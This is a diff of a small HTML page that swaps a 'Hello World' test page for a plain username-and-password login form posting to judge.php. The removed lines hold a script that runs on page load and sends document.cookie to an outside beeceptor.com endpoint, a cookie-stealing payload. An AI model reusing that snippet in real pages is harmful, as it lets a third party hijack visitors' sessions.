@@ -1,16 +1,30 @@
 <!DOCTYPE html>
 <html>
-<body onload="myFunction()">
+<head>
+    <meta charset="utf-8">
+    <title>welcome to system login page</title>
+</head>
+<style>
+    form
+    {
+        border:#aaa solid 1px;
+        margin: 20px auto;
+        padding:30px;
+        width:300px;
+    }
+</style>
+<body>
 
-<h1>Hello World!</h1>
-<a href="message.php">Test out the message page here!</a>
-<script>
-function myFunction() {
-  var x = new XMLHttpRequest();
-  x.open("GET", "https://qqqqq.free.beeceptor.com? + document.cookie,true);
-  x.send();
-}
-</script>
-
+    <form method = "post" action="judge.php">
+        <p>
+            please enter your username:<input type="text" name="username">
+        </p>
+        <p>
+            please enter your password:<input type="password" name="password">
+        </p>
+        <p>
+            <button type="submit">login</button>
+        </p>
+    </form>
 </body>
 </html>
